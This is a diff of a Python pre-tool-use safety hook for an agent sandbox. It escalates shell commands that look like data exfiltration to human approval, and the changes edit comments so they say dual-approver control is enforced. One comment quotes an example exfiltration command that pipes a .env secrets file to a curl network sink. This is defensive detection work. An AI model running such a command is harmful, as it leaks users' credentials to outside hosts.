@@ -215,7 +215,7 @@ async def pre_tool_use(payload: dict[str, Any], layout: FolderLayout) -> dict[st
         environment=getattr(policy, "environment", None),
     )
     # Exfiltration shape: a sensitive source AND a network egress in one shell
-    # command. Deterministic; flags dual control and tells the approver why.
+    # command. Deterministic; forces dual control and tells the approver why.
     # Only ever raises scrutiny — a hard `deny` stays denied.
     if result.trigger == "shell" and result.command and result.verdict in ("allow", "observe", "escalate"):
         from sandbox.safety.exfil import detect as _detect_exfil
@@ -229,8 +229,8 @@ async def pre_tool_use(payload: dict[str, Any], layout: FolderLayout) -> dict[st
             result.reason_code = "EXFIL"
             result.reason = f"possible data exfiltration: {exfil.factor_detail()}"
             # `cat`/`type` are allowlisted, so `cat .env | curl <sink>` would
-            # otherwise be allowed silently. Exfil always faces a human, flagged
-            # for dual control (a second approver is not yet enforced).
+            # otherwise be allowed silently. Exfil always faces two approvers
+            # (dual control, enforced in connector/approval.py).
             result.verdict = "escalate"
 
     result.risk = assessment.to_dict()
@@ -272,7 +272,7 @@ async def pre_tool_use(payload: dict[str, Any], layout: FolderLayout) -> dict[st
 
     # Contextual tier upgrades (safety is monotonic — risk only raises scrutiny):
     #   observe  + high/critical risk → escalate (e.g. reading ~/.ssh outside folder)
-    #   escalate + critical risk      → flagged for dual control (not yet enforced)
+    #   escalate + critical risk      → dual control (two distinct approvers)
     if result.verdict == "observe" and assessment.band in ("escalate", "critical"):
         result.verdict = "escalate"
     if result.verdict == "escalate" and assessment.band == "critical":
